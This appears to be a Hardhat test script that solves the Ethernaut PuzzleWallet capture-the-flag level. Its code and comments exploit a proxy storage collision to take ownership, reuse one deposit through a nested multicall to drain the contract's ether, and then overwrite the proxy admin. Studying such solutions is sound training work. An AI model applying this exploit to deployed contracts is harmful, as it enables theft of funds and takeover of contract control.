import { expect } from "chai";
import { Contract, Signer, BigNumber } from "ethers";
import { keccak256 } from "ethers/lib/utils";
import { ethers } from "hardhat";
import { createChallenge, submitLevel, bigNumberToEther,
         logEvents, dumpStorage, waitTx } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let eoaAddress: string;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;
let ethAmount: BigNumber;
let levelAddress: string = `0xe13a4a46C346154C41360AAe7f070943F67743c9`;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  eoaAddress = await eoa.getAddress();
  const challengeFactory = await ethers.getContractFactory(`PuzzleWallet`);

  ethAmount = ethers.utils.parseEther("0.001");
  const challengeAddress = await createChallenge(levelAddress, ethAmount);

  challenge = await challengeFactory.attach(challengeAddress);

//  const attackerFactory = await ethers.getContractFactory(`YourAttackerSourceFile`);
//  attacker = await attackerFactory.deploy(challenge.address);
});

it("solves the challenge", async function () {
   let provider: any = eoa.provider;

    //  console.log(await challenge.whitelisted(eoaAddress));
  const iface = new ethers.utils.Interface(["function proposeNewAdmin(address _newAdmin) external"]);
  const methodCallData: string = iface.encodeFunctionData("proposeNewAdmin", [ eoaAddress ]);

  

  // You can see that maxBalance is the same as the level address! 
  const maxBalance = (await challenge.maxBalance())._hex;
  console.log("maxBalance: ", maxBalance, "= level address:", levelAddress);
  
  // This will overwrite the `owner` in the delegate contract since it shares the same
  // storage slot.
  tx = await eoa.sendTransaction({
      from: eoaAddress,
      to: challenge.address,
      data: methodCallData
  });
  const txReceipt = await tx.wait();

  // We add the EOA address to the whitelist
  await waitTx(challenge.addToWhitelist(eoaAddress));

  const iface2 = new ethers.utils.Interface(
    ["function setMaxBalance(uint256 _maxBalance) external",
     "function execute(address to, uint256 value, bytes calldata data) external payable",
     "function deposit() external payable", 
     "function multicall(bytes[] calldata data) external payable"]);

  /* Wow, this call to multicall is fiendish! The previous owner of the contract, which is
   * the level address, has a balance that needs to be drained. Unfortunately, `execute`
   * has a precondition that `balances[msg.sender] >= value`. In a multicall 
   * `msg.sender = address(this)`.
   * 
   * So we would need to deposit value into address.this in order to call `execute`. However,
   * this has the effect of increasing the ether balance of the contract! Thus when we try 
   * to transfer out the value, we're just transfering out the value we just deposited. If we
   * try to transfer out the entire balance we don't satisfy the precondition above! 
   * 
   * But what if we could deposit twice in a multicall? If we could then it would use
   * `msg.value` twice and increase `balances[address(this)]` twice but the contract ether
   * balance would only increase by the value sent along with the transaction.
   * 
   * Assume the ether in the contract was only 0.001 ether.
   *   balances[owner] = 0.001 (and that's it)
   *   contract balance = 0.001
   * If we could deposit 0.001, twice, in a multicall then we get:
   *    balances[owner] = 0.001
   *    balances[address(this)] = 0.002
   * but contract balance is only 0.002 
   * This allows us to transfer out all of the balance with "msg.sender = address(this)"
   * 
   * However, there is one more catch! Function `multicall` only allows a single called to `deposit`
   * through the use of a boolean flag called `depositCalled`.
   * This is where we get diabolical. We nest a call to `multicall` inside `multicall` which has the 
   * effect of calling `deposit` a second time in a context where `depositCalled = false`.
   * 
   * And that, my friends, is what the hell is going on in that `multicall` below.
   */

  const executeData = iface2.encodeFunctionData("execute", [eoaAddress, ethers.utils.parseEther("0.002"), []]);
  const depositData = iface2.encodeFunctionData("deposit", []);
  const innerMulticallData = iface2.encodeFunctionData("multicall", [[depositData]]);
  const multicallData = iface2.encodeFunctionData("multicall", [[depositData, innerMulticallData, executeData]]);

  await waitTx(eoa.sendTransaction({
    from: eoaAddress,
    to: challenge.address,
    data: multicallData,
    value: ethAmount
  }));

  // Once the ether is drained we can `setMaxBalance` to the uint256 value of the EOA address
  // This has the effect of overwriting `admin` in the proxy contract storage
  await waitTx(challenge.setMaxBalance(eoaAddress));

});

after(async () => {
  expect(await submitLevel(challenge.address), "level should be solved").to.be.true;
});
